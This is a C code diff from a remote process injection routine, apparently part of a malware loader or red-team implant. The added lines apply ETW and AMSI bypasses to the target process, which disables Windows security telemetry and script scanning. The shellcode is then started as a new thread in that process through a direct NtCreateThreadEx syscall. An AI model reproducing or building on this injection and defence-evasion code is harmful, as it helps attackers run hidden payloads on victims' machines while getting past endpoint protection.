@@ -52,16 +52,23 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 	}
 	PrintMemoryBytes(hProcess, pShellcodeAddress, 20);
 	
+	//	apply ETW bypass
+	if (!applyEtwBypass(hProcess)) {
+		DebugPrint("[!] Failed To Apply ETW Bypass \n");
+		return FALSE;
+	}
+
+	//	apply AMSI bypass
+	if (!applyAmsiBypass(hProcess)) {
+		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
+		CloseHandle(hThread);
+		return FALSE;
+	}
+
 	// Running the shellcode as a new thread's entry in the remote process
 	DebugPrint("[i] Executing Payload ... ");
-#ifdef HW_INDIRECT_SYSCALL
-	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
-	
-	if (!pNtCreateThreadEx) {
-		DebugPrint("[-] Failed to prepare syscall for NtCreateThreadEx.\n");
-		return -2; // Error code
-	}
-	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);
+#ifdef SYSCALL_ENABLED	
+	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);
 	if(!NT_SUCCESS(status)) {
 		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
 		return -1;
